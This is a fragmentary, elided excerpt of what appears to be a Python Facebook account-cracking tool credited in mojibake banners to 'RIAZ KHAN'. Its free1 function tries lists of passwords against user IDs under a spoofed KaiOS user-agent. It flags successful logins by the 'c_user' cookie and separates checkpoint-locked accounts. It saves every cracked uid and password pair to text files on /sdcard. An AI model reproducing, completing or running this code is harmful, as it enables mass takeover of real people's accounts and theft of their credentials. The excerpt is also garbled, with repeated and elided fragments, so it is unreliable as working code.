...
â•‘ Creator  : RIAZ KHAN                       â•‘

â•‘ Github   : https://github.com/F3ogbaba03  â•‘

â•‘ Facebook : RIAZ KHAN                            â•‘
...
def my_tool_security():
    ...
    print("\t  Facebook : RIAZ KHAN ")

    print("\t  Fb page  : RIAZS COMMUNITY ")
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=RIAZ"
...
â•‘ Facebook : RIAZ KHAN  ðŸ™‚â¤ï¸                â•‘

â•‘ Brothers :            RIAZ YT                              â•‘
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[RIAZ-OK] '+uid+' [âˆš] '+ps+ '')

                cek_apk(session,coki)

                open('/sdcard/RIAZ-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[1;34m[RIAZ] '+uid+' [~] '+ps+' ')

                    open('/sdcard/RIAZ.txt', 'a').write(uid+' | '+ps+'\n')
                    ...
                    print(f'\r\033[1;35m[RIAZ-CP] '+uid+' [Ã—] '+ps+ ' ')

                    open('/sdcard/RIAZ-CP.txt', 'a').write(uid+' | '+ps+'\n')
...
def free1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\33[1;37m[RIAZ ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
...
def free1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\33[1;37m[RIAZ ðŸ”¥] [%s] \33[1;97m[OK:%s{RIAZ2}CP:%s]'%(loop,len(ok),len(cp))), 
